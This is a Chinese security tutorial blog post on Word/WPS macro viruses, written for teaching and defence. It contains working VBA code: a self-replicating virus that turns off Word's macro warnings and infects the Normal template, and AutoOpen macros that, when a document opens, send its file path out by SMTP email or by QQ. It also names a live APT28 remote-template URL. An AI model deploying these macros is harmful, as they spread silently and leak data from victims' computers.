> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/j1Sn7_Yi4W_XVGT2rLIzyg)

作者前文介绍了病毒原理和防御知识，并通过批处理代码和漏洞（CVE-2018-20250）利用让大家感受下病毒攻击的过程，提出了安全相关建议；这篇文章将详细讲解宏病毒相关知识，它仍然活跃于各个 APT 攻击样本中，具体内容包括宏病毒基础原理、防御措施、自发邮件及 APT28 样本分析。这些基础性知识不仅和系统安全相关，同样与我们身边常用的软件、文档、系统安全紧密联系，希望这些知识对您有所帮助，更希望大家提高安全意识，安全保障任重道远。本文参考了参考文献中的文章，并结合自己的经验和实践进行撰写，也推荐大家阅读参考文献。

文章目录：

*   **一. 什么是宏**
    
    1. 基础概念
    
    2. 安装配置
    
    3. 录制新宏案例
    
*   **二. 宏病毒**
    
    1. 宏病毒基础
    
    2. 自动宏案例
    
    3. 宏病毒感染
    
*   **三. 宏病毒的自我保护与防御**
    
*   **四. 案例：CDO 自发邮箱**
    
*   **五. 案例：QQ 发送信息**
    
*   **六. APT28 攻击中的宏病毒**
    
    1.OZ 鱼叉邮件
    
    2. 酒店行业鱼叉邮件
    
    3. 研究机构鱼叉邮件
    

> 从 2019 年 7 月开始，我来到了一个陌生的专业——网络空间安全。初入安全领域，是非常痛苦和难受的，要学的东西太多、涉及面太广，但好在自己通过分享 100 篇 “网络安全自学” 系列文章，艰难前行着。感恩这一年相识、相知、相趣的安全大佬和朋友们，如果写得不好或不足之处，还请大家海涵！  
> 接下来我将开启新的安全系列，叫 “系统安全”，也是免费的 100 篇文章，作者将更加深入的去研究恶意样本分析、逆向分析、内网渗透、网络攻防实战等，也将通过在线笔记和实践操作的形式分享与博友们学习，希望能与您一起进步，加油~
> 
> 推荐前文：网络安全自学篇系列 - 100 篇
> 
> https://blog.csdn.net/eastmount/category_9183790.htm

作者的 github 资源：  

*   逆向分析：https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该样本不会分享给大家，分析工具会分享。（参考文献见后）

一. 什么是宏  

==========

1. 基础概念
-------

宏（Macro）是一种批量处理的称谓，是指能组织到一起作为独立的命令使用的一系列 Word 命令，实现任务执行的自动化，简化日常的工作。Microsoft Office 使用 Visual Basic for Applications（VBA）编写宏。

大家可能接触到的宏并不多，但如果经常使用 Word 文档时，可能会遇到宏，比如国家自然科学基金申请，或者作者之前分享的宏技巧。文章如下：

*   WPS Excel 通过添加宏实现多张表格合并
    
*   WPS 通过 VB 宏函数实现自编号功能
    

注意，在 Office 中可以直接使用 Word 的宏函数，而 WPS 需要安装相关的软件后才能使用。打开 WPS Word 如下图所示，宏是不能使用的。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BLKkY02HXHELRsbgiaCO1WeeIkc7icO724ia7m2ElhicWk920eT7jS8ibXFw/640?wx_fmt=png)

2. 安装配置
-------

这时需要下载 VBA for WPS 并安装才能使用（下载地址为第 19 篇）。下载安装如下所示：

*   https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B0ccPd50VmXjqxRNAF5GXF16mblElQic7nCWiaf9bh1KCtoMXAwJvibNmQ/640?wx_fmt=png)

安装完后可以设置宏函数，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BRd6cuAAcejqVk2kK8uTM96PJojDoxuIueAgr5ZfJ41mgX7xMcheeAg/640?wx_fmt=png)

点击 "宏"，然后 "创建" 宏函数，如下图所示，取名为 test。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BXB9oDEibu26YaJvToE3cn6Eibt8yp0ibDSMWsXQf2ibaJiajGTp0YjpW5Pw/640?wx_fmt=png)

创建后如下图所示，可以看到是 VB 代码进行编写的。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BU9Qibria7JANYfdN0MJPjtXWTTsgZPcI9J1a11lZWR9gJjK5Sx08hibUw/640?wx_fmt=png)

代码示例如下：

```
Sub test()'' test Macro'    Dim sLineNum3 As String     '行号(文字)    Dim nLineNum                '行号(数值)    Dim i As Long     Title = "输入编号信息"    a1 = "请输入总编号开始号："    b1 = InputBox(a1, Title)End Sub
```

WPS 可以保存为带宏函数的格式，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BsPBwmLdYXhq3kFoNoIoabTMenXPrauvuMDFQu2kelf1hQBtpahMElA/640?wx_fmt=png)

然后运行宏函数如下图所示，点击 "运行" 即可，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BGWANwqQiaicdcPDolqZbRdIa3Z454qd8a6IDLT50SAphkRjd5VQmGqRA/640?wx_fmt=png)

运行结果如下图所示，弹出界面输入：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BrCSOar4Vpgrbspd7IALC3wkJibMOajL2iciat62qFrNEHrkS52KhZXNcg/640?wx_fmt=png)

3. 录制新宏案例
---------

第一步，降低宏的安全性。  
宏的默认安全性非常高，有时会导致宏程序不会自动执行，我们可以修改降低其安全性。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BTrRh7AKYUmAcTgVFSe4HoCuoxj83PNt0PnhjTjznDv2ImgRFo8z7zA/640?wx_fmt=png)

第二步，设置字体隐藏。  
假设我们现在有这样一个需求，要将文档中的内容隐藏。怎么做呢？传统方法是全选文字，然后设置字体隐藏，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BSaqt6eQhHrBttmD2icj8OMgJKE64NJBL4OUAHX5nddremLtJCGjYaCA/640?wx_fmt=png)

如果需要查看文字再进行还原，这些小技巧往往会隐藏在病毒或木马中。那么，我们是否可以将这隐藏和还原两个操作用两个快捷键关联起来呢？下次再进行相关操作时，会变得更加简洁。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BNaNcJZTtrVIEu0WFVzstnQgbfKg78uvgluia65olRibyd15x8kLDdInw/640?wx_fmt=png)

第三步，点击录制新宏。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BVoQT4N7UbpuQclZxsCMbVUM8Qf5dias6Fia9IO0qQmCJThEJLPRgoE9g/640?wx_fmt=png)

第四步，将刚才的操作执行一遍，全选文字然后隐藏，然后点击停止录制。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BDSLhyMJrYeemgyiagh7EIWIyGVxf1zsWK6MzXhbaWLkDhzDIcmaZ6XA/640?wx_fmt=png)

此时，可以看到我们新创建的宏 MacroHide。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B2pyicicx6XpgtlzNQEDicjTicX2LarjRLp6spZDicqfIWvfgSxKQW76gSOA/640?wx_fmt=png)

第五步，再录制一个显示的新宏 MacroShow。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BqskD7icJT5yQzy2mlCciaR6Dsd2iaBxMfdxHfViam4SChCnlKzXkWvmEgg/640?wx_fmt=png)

显示之后我们停止录制。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BofIeH4EUtT4ibU5RKib6wtbUicTq1nNssJEtue7GlAx3sAjPibYoMeqJjw/640?wx_fmt=png)

第六步，绑定快捷键。  
如果是在 Office 中，可以直接选择对应的快捷键，但 WPS 设置不同。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BziaTGvEcdgkSZhTqC21y6MFepJraA6upj2Bf6hIu340D8r65PeGhdzA/640?wx_fmt=png)

WPS 设置如下：点击 “文件”->“选项”，在“选项” 界面最左侧找到并点击 “自定义功能区”，选择“自定义” 按钮。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BRibL9V2sibh4lK9oguJJiasLZJ0sTSDmzNuQV8VODs8TbrtjibCib9nu8ow/640?wx_fmt=png)

设置快捷键如下：

*   MacroHide 对应 Ctrl+Shift+H
    
*   MacroShow 对应 Ctrl+Shift+S
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BkJBw3ss847lGAY9DM5oqscCYVdbKdUH7qWcJkMIfJiaNZDCBgGZNVsg/640?wx_fmt=png)

此时，功能已经实现，当我们按下 “Ctrl+Shift+H” 时，文字隐藏，按下 “Ctrl+Shift+S” 时文字显示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B4TWTBF4RvyNKdpcMO6KTZpXHsqze3tQIXfK2RY5XxtowQianQdAfAyQ/640?wx_fmt=png)

当然宏可以更加复杂，接下来我们将介绍。同时，怎么去查看宏代码呢？通过 VB 编辑器能够查看宏代码，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BcErySib0ShOKzFmzGEuQc8xH3KKicKicaZdSayg4RQht4sU8rkXgicracw/640?wx_fmt=png)

在 Normal 下的模块 =>NewMacros 有我们刚刚编辑的两个宏。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BvDWxo3H8QUzsDa2HwA7iaDrib1Q8tNV8zQR2m0rBqKbKHMoYhb7svZjw/640?wx_fmt=png)

该代码的核心内容如下：

*   Selection.WholeStory 全选功能
    
*   Selection.Font 字体设置
    
*   Hidden = 1 隐藏属性设置为 True
    

```
Sub MacroHide()'' MacroHide Macro' 宏由 Eastmount 录制，时间: 2020/04/20'    Selection.WholeStory    With Selection.Font        .Underline = wdUnderlineNone        .EmphasisMark = wdEmphasisMarkNone        .Hidden = 0        .Shadow = 0        .Outline = 0        .Emboss = 0        .Engrave = 0        .Scaling = 100        .Scaling = 100        .Hidden = 1        .Hidden = 1    End WithEnd Sub
```

二. 宏病毒
======

1. 宏病毒基础
--------

那么，什么又是宏病毒呢？  
宏病毒是一种寄存在文档或模板的宏中的计算机病毒，存在于数据文件或模板中（字处理文档、数据表格、数据库、演示文档等），使用宏语言编写，利用宏语言的功能将自己寄生到其他数据文档。

最早的时候，人们认为数据文档是不可能带有病毒的，因为数据文档不包含指令，直到宏病毒出现才改变大家的看法。当我们打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在 Normal 模板上。从此以后，所有自动保存的文档都会 “感染” 上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。

那么，宏病毒又如何获得这些控制权呢？  
只有拿到控制前之后宏病毒才能进行传播。它和 Office 的特性相关，Office 支持一些自动执行的宏，如果将病毒代码放到自动执行的宏中，Word 打开时会给病毒传播创造条件。利用自动执行宏将病毒代码写在宏汇中，由于这些宏会自动执行，从而获取控制权。

(1) WORD

*   AutoOpen：打开 Word 文档
    
*   AutoClose：关闭 Word 文档
    
*   AutoExec：打开 Word 程序（Word 文档和 Word 程序区别）
    
*   AutoExit：退出 Word 程序
    
*   AutoNew：新建宏
    

(2) EXCEL

*   Auto_Open
    
*   Auto_Close
    
*   Auto_Activate
    
*   Auto_Deactivate
    

(3) Office97/2000

*   Document_Open
    
*   Document_Close
    
*   Document_New
    

2. 自动宏案例
--------

我们通过 VB 编辑器增加宏代码，定义了五个自动宏。

*   第一个是新建文件：AutoNew
    
*   第二个是退出程序：AutoExit
    
*   第三个关闭文档：AutoClose
    
*   第四个打开文档：AutoExec
    
*   第五个打开程序：AutoExec
    

注意，程序指 WPS 或 Office，一个程序可以打开或创建多个文档，他们存在一定区别。同样，它们的权限也有区别。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BibVH3j6C6qB45ksceXcLNKOdDh1BroXAER7hy26GKZcbJ1VLfxzDhdQ/640?wx_fmt=png)

代码如下：

```
Sub AutoOpen()  MsgBox "您好，您打开了Word文档！", 0, "宏病毒测试"End SubSub AutoExec()  MsgBox "您好，您打开了Word程序！", 0, "宏病毒测试"End SubSub AutoNew()  MsgBox "您好，您选择了新建文件！", 0, "宏病毒测试"End SubSub AutoExit()  MsgBox "欢迎下次光临！", 0, "宏病毒测试"End SubSub AutoClose()  MsgBox "下次还要来哦！", 0, "宏病毒测试"End SubSub MyFirstVBAProcedure()    Dim NormProj    MsgBox "欢迎光临XXXXXX安全实验室！", 0, "宏病毒测试"    Set NormProj = NormalTemplate.VBProject    MsgBox NormProj.Name, 0, "模块文件名"    '显示模板文件的名字    With Assistant.NewBalloon           '调出助手        .Icon = msoIconAlert        .Animation = msoAnimationGetArtsy        .Heading = "Attention，Please!"        .Text = "Today I turn into a martian!"        .Show    End WithEnd Sub
```

当我们打开 Word 时，会提示我们安全警告，选择 “启用宏”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BV5EhttqibXPHHuHPYhSnvnHzxB4ic7PqAsuR0FJow22iayjF2AQAtejicw/640?wx_fmt=png)

此时会提示一个打开 Word 文档的对话框，表示 AutoOpen 宏自启动。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BSJTmpRyn7Vx27Z9nHIaBuLCiaHqTk2YVicL27x0lzV3FiaCF0MibQbib3YQ/640?wx_fmt=png)

当我们关闭程序会提示如下对话框。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BYtGze5FjeOsics0ALrg0IHhBkc14Yxuwy6H4jfN67jNGEiaECyAVJia2A/640?wx_fmt=png)

如果我们想要查看宏的具体定义，可以查看定义的函数，如下图所示，也可以在工具栏中选择 VB 编辑器查看代码。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B36TIibKhT8w7kKOfXO3ARG44iaVn7lTyVksALncia65SiaHnJ6MaibHd1Ng/640?wx_fmt=png)

当我们执行某个函数，会有对应的执行效果。比如弹出 “宏病毒测试” 对话框。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BD8ljfCccAC7jNviaP8YHP6ucfib9uR4lib0LticMsUKORa11CscGsdZ5jA/640?wx_fmt=png)

你可能会疑惑，为什么只弹出了两个对话框呢？  
因为宏包括两种类型——局部宏和全局宏。而退出 Word 程序和进入 Word 程序不是当前文档能定义的。其他三个宏无法起到作用，我们需要将它们复制到 Normal 模块中才能运行。

3. 宏病毒感染
--------

在 Word 和其他微软 Office 系列办公软件中，宏分为两种。

*   内建宏：局部宏，位于文档中，对该文档有效，如文档打开（AutoOpen）、保存、打印、关闭等
    
*   全局宏：位于 office 模板中，为所有文档所共用，如打开 Word 程序（AutoExec）
    

宏病毒的传播路线如下：

*   单机：单个 Office 文档 => Office 文档模板 => 多个 Office 文档（文档到模块感染）
    
*   网络：电子邮件居多
    

首先 Office 文档被感染病毒，当文档打开会执行自动宏，如果宏被执行，它会去检测当前模板是否被感染病毒，如果没有被感染，它会将释放自身的病毒代码。当模板被感染之后，系统中任何一个文档被打开，都会执行模板中的病毒，宏病毒进行传播。

宏病毒的感染方案就是让宏在这两类文件之间互相感染，即数据文档、文档模板。 下面是《软件安全》课程的示例图。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BmCWGGpYcmjZZpkuIdw1zCTxesq5KLWCrRlPfm5qckZJo55NIhX81Pw/640?wx_fmt=png)

注意，宏代码是可以调试的。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BhuudPcVl3icnDSU8aICENXqwBgSPkLowzlUkDryn5uS93D3Pj3bEqhg/640?wx_fmt=png)

完整代码如下：

```
Sub test()    'On Error Resume Next    Application.DisplayAlerts = wdAlertsNone    Application.EnableCancelKey = wdCancelDisabled    Application.DisplayStatusBar = False    Options.VirusProtection = False    Options.SaveNormalPrompt = False        '以上是病毒基本的自我保护措施    Set Doc = ActiveDocument.VBProject.VBComponents    '取当前活动文档中工程组件集合    Set Tmp = NormalTemplate.VBProject.VBComponents    '取Word默认模板中工程组件集合    Const ExportSource = "c:\jackie.sys"    Const VirusName = "AIGTMV1"               '该字符串相当于一个病毒感染标志    Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource                                 '将当前病毒代码导出到c:\jackie.sys文件保存                                     For i = 1 To Tmp.Count        If Tmp(i).Name = VirusName Then TmpInstalled = 1     '检查模板是否已经被感染病毒    Next i        For j = 1 To Doc.Count        If Doc(j).Name = VirusName Then DocInstalled = 1                                     '检查当前活动文档是否已被感染病毒    Next j    If TmpInstalled = 0 Then                 '如果模板没有被感染，对其进行感染        Tmp.Import ExportSource              '从c:\jackie.sys将病毒导入模板        NormalTemplate.Save                  '自动保存模板，以免引起用户怀疑     End If    If DocInstalled = 0 Then                 '如果当前活动文档没有被感染        Doc.Import ExportSource              '从c:\jackie.sys将病毒导入当前活动文档        ActiveDocument.SaveAs ActiveDocument.FullName '自动保存当前活动文档    End If    MsgBox "Word instructional macro by jackie", 0, "Word.APMP"End Sub
```

宏病毒也可以通过网络进行传播，譬如电子邮件。

*   Mellisa 病毒：自动往 OutLook 邮件用户地址簿中的前 50 位用户发送病毒副本
    
*   “叛逃者” 病毒：也集成了感染 Office 文档的宏病毒感染功能，并且可以通过 OutLook 发送病毒副本
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BL8qOib8N6H0vlSWTbp9he5NmsPRxJLUAaMRp4C0ppPTJ92QtNr5FdKw/640?wx_fmt=png)

三. 宏病毒的自我保护与防御
==============

宏病毒的自我保护主要包括三种方法：

(1) 禁止提示信息

On Error Resume Next 如果发生错误，不弹出错窗口，继续执行下面语句：

*   Application.DisplayAlerts = wdAlertsNone 不弹出警告窗口
    
*   Application.DisplayStatusBar = False 不显示状态栏，以免显示宏的运行状态
    
*   Options.VirusProtection = False 关闭病毒保护功能，运行前如果包含宏，不提示
    
*   …
    

(2) 屏蔽命令菜单，不允许查看宏

*   通过特定宏定义
    

```
Sub ViewVBCode()    MsgBox "Unexcpected error",16End Sub
```

ViewCode：该过程和 ViewVBCode 函数一样，如果用户按工具栏上的小图标就会执行这个过程。

*   Disable 或者删除特定菜单项  
    用来使 “工具—宏” 菜单失效的语句  
    CommandBars(“Tools”).Controls(16).Enabled = False
    

(3) 隐藏宏的真实病毒代码  
在 “自动宏” 中，不包括任何感染或破坏的代码，但包含了创建、执行和删除新宏（实际进行感染和破坏的宏）的代码；将宏代码字体颜色设置成与背景一样的白色等。

宏病毒的防御措施包括：

*   一旦发现计算机 Office 软件打开后弹出系统警告框，并且无法 “另存为”，就表示该文件已感染宏病毒，此时不能再打开其他文件，否则病毒也会感染，应马上关闭删除该文件。若文件重要不能删除，则需用杀毒软件全盘扫面，处理感染文件。
    
*   开启禁用宏进行防止再次感染病毒。在 “受信任位置” 中，删除 “可靠来源” 列表框中的不安全来源，根据实际情况设置是否信任所有安装的加载项和模板，设置宏的安全性。
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BkFReuiaoGlCwDnRnsQYgQyzoALnMlqASJMGEYs3F41uIv1xPWcnia0pA/640?wx_fmt=png)

*   安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒，除此这些常规手段之外，宏病毒还有专门的防治措施。
    
*   在线沙箱检测文档是否宏病毒。
    

四. 案例：CDO 自发邮箱
==============

接下来我们制作一个宏，当对方打开文档时就知道该文档在对方电脑存储的具体路径。常见方法包括：

*   邮件组件，如 CDO 组件
    
*   远程脚本
    

这里采用 CDO 自发邮件实现。通过 Word VB 编写脚本，设置文档打开时运行，利用 CDO 发送电子邮件将文件的路径和名字发送到指定邮箱中。具体步骤如下：

*   1) 利用 AutoOpen 执行并打开文档时运行
    
*   2) 利用 WordObj.ActiveDocument 获取文件信息
    
*   3) 利用 CDO 实现电子邮件实现信息传递
    

注意，千万别小瞧这个功能，如果是一封钓鱼邮件或运行宏病毒自动采集个人电脑信息发送至指定邮件，其危害性非常大，而且该攻击手段广泛存在于许多亚洲 APT 组组中。

定义的宏函数为 AutoOpen，如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B7gSReORZKqosFxlVdVqEzxMza5ibbQtwUNGKJCF2wOia6Sfdw2YdPQRw/640?wx_fmt=png)

核心代码如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BSmuxPuLB36CDJ7hHykSKbjMsibGqdgHpU99oVeD11UuJ2CSkiaLItZXw/640?wx_fmt=png)

完整代码如下，包括获取文件夹路径、定义邮件地址、添加 CDO 库、设置微软服务器、CDO 邮件参数设置、发送数据

```
Sub AutoOpen()' AutoOpen宏' By: CSDN Eastmount 2020-04-21        ' 获取文件夹路径    Dim WordObj As Object    Dim Doc As Object    Set WordObj = GetObject(, "Word.Application")    Set Doc = WordObj.ActiveDocument    MsgBox (Doc.Path)        ' 定义邮件地址    Const from1 = "152xxxxxxxx@163.com"    Const to1 = "xxxxxxxxxx@qq.com"    Const password = "xxxxxxxxxx"        ' 添加CDO库    Set CDO = CreateObject("CDO.Message")    CDO.from = from1    CDO.to = to1    CDO.Subject = Doc.Name    CDO.Textbody = Doc.Path        ' 微软服务器网址    MsgBox ("发送邮件")    Const proxyUrl = "http://schemas.microsoft.com/cdo/configuration/"    With CDO.Configuration.Fields        .Item(proxyUrl & "sendusing") = 2                     '发送端口        .Item(proxyUrl & "smtpserver") = "smtp.163.com"       'SMTP服务器地址        .Item(proxyUrl & "smtpserverport") = 25               'SMTP服务器端口        .Item(proxyUrl & "smtpauthenticate") = 1              '是否开启用户名密码验证        .Item(proxyUrl & "sendusername") = from1              '发送方邮箱名称        .Item(proxyUrl & "sendpassword") = password           '发送方邮箱密码        .Item(proxyUrl & "smtpusessl") = True                 '是否使用ssl协议        .Item(proxyUrl & "smtpconnectiontimeout") = 60        '时延        .Update    End With        ' 发送数据    CDO.Send    Set CDO = Nothing    MsgBox ("成功!")End Sub
```

当 test04.doc 文件打开时，它会自动运行，其结果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BDHqgibWtY1RkNgB4MuzCqb6geVdpC7HqmOWyibPYh8VriciczObj08VvRw/640?wx_fmt=png)

接着对话框提示发送邮件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BYzTFH0xI1ibcX6yVRHv9P8HkZick8e7pjiaJemv6Rjm4O2outWdNNIeUA/640?wx_fmt=png)

最终邮件通过宏病毒发送成功。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BqLmCTngIqYIJJPOeEFx2HRth8zT80IFXWjK6QtoVLqel2ZFRToDLoA/640?wx_fmt=png)

下图可见，成功将 Word 稳定打开的路径地址发送到了目标邮箱，如果宏病毒再获取更详细的信息或文件，是否也能发送到指定邮箱呢？这样的恶意代码仍需要重视。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BDicj6hAIeTwQ8CMJgUU2Lh5w3gzU7IbvS80ccV1X6UK2cC8ibpXLeibkA/640?wx_fmt=png)

注意事项及常见错误：  
(1) 如果在撰写宏病毒过程中，出现 “缺少: 列表分隔符或)”，我们需要进行调试及修改。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4B64NRWibvLk6mE2IT4j6MoJcfM1pbP0zgAK6g44w861vqM1SzKYJtgAA/640?wx_fmt=png)

(2) 如果提示 “邮件无法发送到 SMTP 服务器，传输错误代码为 0x80040217。服务器响应为 not available”，则需要开启 STMP 授权。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BOLM5Z4o8A0hicTo0D6wBTHgEibMsMaFnnQTd6h7WgWX0r7QeGRicYZzZw/640?wx_fmt=png)

CDO 发送邮件时需要开启邮件的 stmp 授权代理，网易邮箱 163 设置方法如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BIEAS7yZ74FTswErgib1mobMTNZITMdGG2rBoHdOAaNUEQ9PlXerPwxA/640?wx_fmt=png)

如果腾讯邮箱要开启 SMTP/POP3 服务，则将生成的授权码当作邮箱登陆密码来进行邮件发送，注意设置的是授权码而不是密码。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4Bf1zvGcyc2k8AbuGVpicT6bXFK8YBFiaEW89u5NZ4pewxVHlGUXTfvKwQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BNEwflDEVgx3ia3DiaiaOCnLE2OwWl4xYW9XTJPyr5RdG0wsQ0IK0oZ1Kw/640?wx_fmt=png)

(3) 如果 wps 报 429 ActiveX 不能创建对象 ，则解决方法参考：

*   https://www.cnblogs.com/pyman/p/7918484.html
    

五. 案例：QQ 发送信息
=============

接着通过 QQ 发送信息来制作宏病毒，并获取对方电脑存储的具体路径。具体流程：

*   获取文件路径
    
*   将路径复制至剪贴板
    
*   发送 QQ 消息
    
*   通过 sendkeys 输入 ctrl+V 发送粘贴内容
    

注意，腾讯 WebQQ 停止运营了，且不好获取 QQ 的聊天窗口句柄，才采用了该方法。该部分主要参考师弟的代码，再次感谢。

完整宏代码如下：

```
Sub AutoOpen()    ' 获取文件路径    DocPath = ActiveDocument.Path    DocName = ActiveDocument.Name    Text1 = "DocPath:" + DocPath    Text2 = "DocName:" + DocName    Result = Text1 + Text2    MsgBox (Result)        ' 将内容送入剪贴板    With CreateObject("new:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")        .SetText Result        .PutInClipboard    End With        ' 发送QQ消息    Shell "cmd /c start tencent://Message/?Uin=QQ号码&we^v"    SendKeys "{ENTER}"    SendKeys "{ENTER}"    SendKeys "^{ENTER}"End Sub
```

运行代码如下，获取了 Word 文档的路径。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BgbC20vAssbdsI9KtS4YMVyhlTH9Vyt5tvbILSYUdicN3YdziaujbKkTg/640?wx_fmt=png)

此时内容复制至剪贴板，如果输入 Ctrl+V，输出内容如下：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BhPa5VlZAP6IKjQWvdiaxpEgFFGE1veovnw8YXpdeNBzbZRfeyIibGq1g/640?wx_fmt=png)

通过下面的命令可以直接打开某个 QQ 的窗口。

*   cmd /c start tencent://Message/?Uin=QQ 号码 &weName=qzone.qq.com & Menu=yes
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BEUsHVMcibIbzCpOp0fibjlYRDnYdvIguYPOyvEajPibsWviaFu6grkgPxA/640?wx_fmt=png)

最终当我们打开 Word 文档，它会执行自动代码，并向某个 QQ 号自动发送信息，运行效果如下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDRN64YH0rOavsCGafc1t4w4BQaTQa1qSex0P1S9icQB8QoQVYE7g5dCanF5ictw7jJewTRx7TwdL83Zw/640?wx_fmt=png)

六. APT28 攻击中的宏病毒
================

最后分享先知社区关于 APT28 样本的宏病毒分析，和作者的这篇文章基础知识非常相关。如果该部分有不当的地方，可以提醒我删除，感谢。参考文献：

*   APT28 样本分析之宏病毒分析
    
*   https://xz.aliyun.com/t/3427
    

APT28 组织是一个与 ELS 有关的高级攻击团伙，本次分析的是该团伙使用的宏病毒，所有资料均来自互联网。比如，2018 年 10 月到 11 月 OZ 外交处理事务组织的鱼叉邮件（paloalto），2017 年 7 月到 8 月酒店行业的鱼叉邮件（Fireeye），2017 年 10 月 MG 研究机构的鱼叉邮件（cisco）。

1.OZ 鱼叉邮件
---------

*   文件名称：crash list(Lion Air Boeing 737).docx
    
*   SHA-256 2cfc4b3686511f959f14889d26d3d9a0d06e27ee2bb54c9afb1ada6b8205c55f
    
*   创建时间：2018:09:11 04:22:00Z
    
*   文件大小：32.9 KB (33,775 字节)
    
*   基本方法  
    打开文档会进行远程模板加载，使用这种攻击首先初始文件不会有明显的恶意代码，并且可以收集受害者的 IP，一旦攻击成功，就关闭服务器，难以追踪。
    

首先，远程模板的位置 http://188.241.58.170/live/owa/office.dotm。注意，在分析恶意样本时，千万别访问这些远程链接或文件，很可能中病毒或成为肉鸡。

